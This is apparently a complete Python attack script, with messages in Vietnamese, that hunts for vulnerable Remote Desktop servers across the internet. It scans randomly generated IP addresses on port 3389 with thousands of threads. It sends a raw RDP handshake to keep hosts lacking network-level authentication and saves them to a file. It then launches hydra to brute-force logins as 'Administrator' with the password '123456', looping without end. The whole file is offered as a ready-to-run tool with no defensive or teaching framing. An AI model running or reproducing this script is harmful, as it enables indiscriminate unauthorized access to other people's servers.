import random
import socket
import threading
import os
import platform

system_name = platform.system()
print("tool dùng hạn chế trên window") if system_name in "Windows" else print("tải hydra về trước khi dùng 'sudo apt install hydra'")

class BruteForceVPS:
    def __init__(self, username="Administrator", password="123456", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
        self.username = username
        self.password = password
        self.hydra_output = hydra_output
        self.targets_ip_path = targets_ip_path
        self.ip_log = []

    def random_ip(self):
        while True:
            g1 = str(random.choice([i for i in range(253)]))
            g2 = str(random.choice([i for i in range(253)]))
            g3 = str(random.choice([i for i in range(253)]))
            g4 = str(random.choice([i for i in range(253)]))
            return f"{g1}.{g2}.{g3}.{g4}"

    def check_rdp(self):
        try:
            ip = self.random_ip()
            session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            session.settimeout(1)
            check_result = session.connect_ex((ip, 3389))
            if check_result == 0 and ip not in self.ip_log:
                self.ip_log.append(ip)
                session.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
                response = session.recv(1024)
                filter_rdp_non_verify = [b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00",
                                        b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x0f\x08\x00\x02\x00\x00\x00"]
                if response in filter_rdp_non_verify:
                    print(f"đã tìm thấy {ip}")
                    with open(self.targets_ip_path, "a", encoding="utf-8") as file:
                        file.write(f"{ip}\n")
        except:
            pass

    def multi_thread_scan(self, thread_num=5000):
        for _ in range(thread_num):
            thread = threading.Thread(target=self.check_rdp)
            thread.start()

    def scan_ip(self):
        self.multi_thread_scan()
    
    def hydra_attack(self, hydra_thread=1):
        os.system(f"hydra -t {hydra_thread} -l {self.username} -p {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
    

    def run(self):
        while True:
            if os.path.exists(self.targets_ip_path) == True:
                os.remove(self.targets_ip_path)
            for _ in range(5):
                self.scan_ip()
            self.hydra_attack()

brute = BruteForceVPS()
brute.run()
